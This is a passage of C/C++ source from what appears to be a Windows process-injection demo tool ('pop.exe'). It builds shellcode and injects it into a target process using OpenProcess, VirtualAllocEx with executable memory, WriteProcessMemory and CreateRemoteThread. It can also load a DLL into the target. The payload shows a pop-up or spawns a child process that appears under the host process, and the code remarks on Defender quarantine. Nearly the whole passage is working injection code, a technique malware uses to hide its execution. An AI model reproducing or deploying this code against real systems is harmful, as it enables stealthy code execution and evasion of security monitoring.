            printf("\n%s[!]%s %s%sfailed%s   step [6] - LoadLibraryA returned NULL inside target\n",
                   RED, RESET, RED, BOLD, RESET);
            printf("%s[*]%s %shint%s     arch mismatch, missing dep, Defender quarantine, or DllMain=FALSE\n",
                   YELLOW, RESET, YELLOW, RESET);
            CloseHandle(hT); CloseHandle(hProc); system("pause"); return 5;
        }
        _snprintf_s(val, sizeof(val), _TRUNCATE, "HMODULE 0x%lX", hmod);
        step(6, "GetExitCodeThread", "ok", val);

        printf("\n%s[+]%s %s%ssuccess%s  DLL loaded inside %s%s%s (PID %s%lu%s)\n",
               GREEN, RESET, GREEN, BOLD, RESET, CYAN, host_name, RESET, CYAN, target_pid, RESET);

        CloseHandle(hT); CloseHandle(hProc);
        system("pause");
        return 0;
    }

    if (msg_mode) {
        if (!custom_msg) {
            snprintf(default_msg, sizeof(default_msg),
                     "Process injection in %s (PID %lu) successful!\r\n\r\n"
                     "This MessageBox is running INSIDE the host process.\r\n"
                     "Shellcode injected via CreateRemoteThread.\r\n\r\n"
                     "- pop.exe demo",
                     host_name, target_pid);
            custom_msg = default_msg;
        }
        printf("[+] mode: MessageBox popup\n");
        printf("[+] text: %.80s%s\n", custom_msg, strlen(custom_msg) > 80 ? "..." : "");
        sc = build_msgbox_shellcode(custom_msg, &sclen);
    } else {
        printf("[+] mode: spawn child process -> %s\n", spawn_cmd);
        sc = build_spawn_shellcode(spawn_cmd, &sclen);
    }

    if (!sc) { printf("[!] shellcode build failed\n"); system("pause"); return 2; }
    printf("[+] shellcode: %zu bytes\n", sclen);

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProc) {
        printf("[!] OpenProcess(%lu) failed: %lu  (try running as Administrator)\n",
               target_pid, GetLastError());
        free(sc);
        system("pause");
        return 3;
    }

    LPVOID remote = VirtualAllocEx(hProc, nullptr, sclen,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!remote) { printf("[!] VirtualAllocEx %lu\n", GetLastError()); free(sc); system("pause"); return 4; }

    SIZE_T w = 0;
    WriteProcessMemory(hProc, remote, sc, sclen, &w);
    printf("[+] wrote %zu bytes to %p inside %s\n", w, remote, host_name);
    free(sc);

    HANDLE hT = CreateRemoteThread(hProc, nullptr, 0,
                                   (LPTHREAD_START_ROUTINE)remote,
                                   nullptr, 0, nullptr);
    if (!hT) { printf("[!] CreateRemoteThread %lu\n", GetLastError()); system("pause"); return 5; }
    WaitForSingleObject(hT, 5000);
    CloseHandle(hT);
    CloseHandle(hProc);

    if (msg_mode) {
        printf("\n[+] DONE. A pop-up should appear owned by %s.\n", host_name);
        printf("    Click OK on the pop-up to let the injected thread exit.\n");
    } else {
        printf("\n[+] DONE. Check:\n");
        printf("    Task Manager > Details tab: find the spawned process; Parent PID = %lu\n", target_pid);
        printf("    System Informer: the spawn appears indented under %s\n", host_name);
    }
    system("pause");
    return 0;
}
